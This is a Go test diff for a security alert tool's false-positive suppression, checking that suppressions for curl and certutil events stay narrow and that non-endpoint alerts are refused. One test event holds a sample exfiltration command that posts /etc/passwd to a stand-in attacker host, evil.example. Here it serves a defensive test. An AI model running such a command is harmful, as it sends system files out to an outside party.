@@ -63,6 +63,23 @@ func TestFalsePositiveProposalAndMatching(t *testing.T) {
 			check: func(s EndpointSuppression) bool { return s.CmdlineContain != "" && s.ParentProcess == "" },
 		},
 		{
+			name: "system program (curl): narrowed to the command line, not every curl",
+			alert: fpAlert(10, "L-T1048", "web1", store.Event{Host: "web1", EventType: "process", ProcessName: sp("curl"),
+				ImagePath: sp("/usr/bin/curl"), FileHash: sp("curlhash"), CommandLine: sp("curl -sk https://127.0.0.1/auth/login --data @/tmp/login.json")}),
+			same:  store.Event{Host: "web4", EventType: "process", ImagePath: sp("/usr/bin/curl"), CommandLine: sp("curl -sk https://127.0.0.1/auth/login --data @/tmp/login.json")},
+			other: store.Event{Host: "web1", EventType: "process", ImagePath: sp("/usr/bin/curl"), FileHash: sp("curlhash"), CommandLine: sp("curl -X POST --data @/etc/passwd https://evil.example/")},
+			check: func(s EndpointSuppression) bool { return s.FileHash == "" && s.CmdlineContain != "" },
+		},
+		{
+			name: "Windows system program: narrowed to the parent",
+			alert: fpAlert(11, "W-T1562.001d", "ws1", store.Event{Host: "ws1", EventType: "process", ProcessName: sp("certutil.exe"),
+				ImagePath: sp(`C:\Windows\System32\certutil.exe`), FileHash: sp("certhash"), CommandLine: sp("certutil -urlcache x"),
+				Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Program Files\\Vendor\\agent.exe"}}`)}),
+			same:  store.Event{Host: "ws2", EventType: "process", ImagePath: sp(`C:\Windows\System32\certutil.exe`), Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Program Files\\Vendor\\agent.exe"}}`)},
+			other: store.Event{Host: "ws1", EventType: "process", ImagePath: sp(`C:\Windows\System32\certutil.exe`), FileHash: sp("certhash"), Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Windows\\System32\\cmd.exe"}}`)},
+			check: func(s EndpointSuppression) bool { return s.FileHash == "" && s.ParentProcess != "" },
+		},
+		{
 			name:    "threat-intel hash: the indicator, every intel source",
 			alert:   fpAlert(3, "IOC:threatfox:hash", "ws1", winProc, "hash", "aabbcc"),
 			same:    store.Event{Host: "srv2", EventType: "file"},
@@ -152,5 +169,23 @@ func TestDomainCovers(t *testing.T) {
 		if domainCovers(c.d, c.q) != c.want {
 			t.Errorf("%s / %s", c.d, c.q)
 		}
+	}
+}
+
+func TestFalsePositiveOnlyEndpoint(t *testing.T) {
+	// Non-endpoint and legacy alerts carry no evidence: the handler refuses them (ev == nil).
+	for _, a := range []store.Alert{
+		{ID: 1, RuleID: "APM-013", Evidence: endpointEvidence("signature", store.Event{EventType: "app.slo"})},
+		{ID: 2, RuleID: "DEV-001", Evidence: endpointEvidence("signature", store.Event{EventType: "devops.push"})},
+		{ID: 3, Title: "legacy"},
+	} {
+		if _, ev, _, _ := fpProposal(a); ev != nil {
+			t.Errorf("alert %d: treated as an endpoint alert", a.ID)
+		}
+	}
+	// An endpoint alert with nothing to match on is still an endpoint alert (closed without a suppression).
+	empty, _ := json.Marshal(AlertEvidence{Origin: "endpoint", Kind: "signature"})
+	if _, ev, ok, _ := fpProposal(store.Alert{ID: 4, RuleID: "W-T1562.001d", Evidence: empty}); ev == nil || ok {
+		t.Error("endpoint alert without matchers: want endpoint, no suppression")
 	}
 }
